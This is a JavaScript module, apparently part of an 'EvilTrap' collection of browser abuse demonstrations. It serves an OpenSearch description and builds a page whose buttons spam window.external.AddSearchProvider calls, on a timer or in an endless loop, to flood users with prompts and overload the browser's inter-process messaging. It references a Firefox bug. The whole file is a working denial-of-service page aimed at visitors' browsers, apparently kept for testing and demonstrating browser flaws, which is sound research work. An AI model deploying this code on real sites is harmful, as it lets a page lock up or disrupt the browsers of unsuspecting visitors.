const EvilTrap = require('../../EvilTrap');

module.exports = new EvilTrap('addSearchProvider Prompt Spam', EvilTrap.CATEGORY.PROMPTSPAM, 'Spams prompts and IPC by calling window.external.addSearchProvider.', { firefox: '615761' })
  .routeBuilder((router) => {
    router.get('/opensearch.xml', (req, res) => {
      res.set('Content-Type', 'text/xml');
      res.status(200).send(`<?xml version="1.0" encoding="UTF-8"?>
      <OpenSearchDescription xmlns="http://a9.com/-/spec/opensearch/1.1/">
        <ShortName>Evil Trap Search</ShortName>
        <Description>Not a real search engine</Description>
        <Tags>eviltraps</Tags>
        <Url type="application/opensearchdescription+xml" rel="self" template="https://${req.headers.host}/opensearch.xml"/>
        <Url type="text/html" template="https://${req.headers.host}/search?q={searchTerms}"/>
        <Query role="example" searchTerms="search term"/>
      </OpenSearchDescription>`);
    });
  })
  .addScriptPage(() => {
    function spamAddSearchProvider(uri, { overloadIPC = false, intervalMS = 500 } = {}) {
      if (overloadIPC) {
        // eslint-disable-next-line no-constant-condition
        while (true) {
          window.external.AddSearchProvider(uri);
        }
      }

      // Since the scope of this prompt DoS rather than IPC DoS, only trigger prompts every few ms.
      setInterval(() => {
        window.external.AddSearchProvider(uri);
      }, intervalMS);
    }

    const intervalInputLabel = document.createElement('label');
    intervalInputLabel.innerText = 'Call interval (ms)';

    const intervalInput = document.createElement('input');
    intervalInput.type = 'number';
    intervalInput.value = 500;

    document.body.appendChild(intervalInputLabel);
    document.body.appendChild(intervalInput);

    const ipcCheck = document.createElement('input');
    ipcCheck.type = 'checkbox';

    const ipcCheckLabel = document.createElement('label');
    ipcCheckLabel.innerText = 'Overload IPC';

    ipcCheck.addEventListener('change', () => {
      intervalInput.disabled = ipcCheck.checked;
    });

    document.body.appendChild(ipcCheckLabel);
    document.body.appendChild(ipcCheck);

    const btnInvalidEngine = document.createElement('button');
    btnInvalidEngine.innerText = 'Invalid Search Engine';
    btnInvalidEngine.addEventListener('click', () => spamAddSearchProvider(' ', {
      intervalMS: Number.parseInt(intervalInput.value, 10), overloadIPC: ipcCheck.checked,
    }), { once: true });

    const btnValidEngine = document.createElement('button');
    btnValidEngine.innerText = 'Valid Search Engine';

    btnValidEngine.addEventListener('click', () => spamAddSearchProvider('opensearch.xml', {
      intervalMS: Number.parseInt(intervalInput.value, 10), overloadIPC: ipcCheck.checked,
    }), { once: true });

    document.body.appendChild(btnInvalidEngine);
    document.body.appendChild(btnValidEngine);
  });
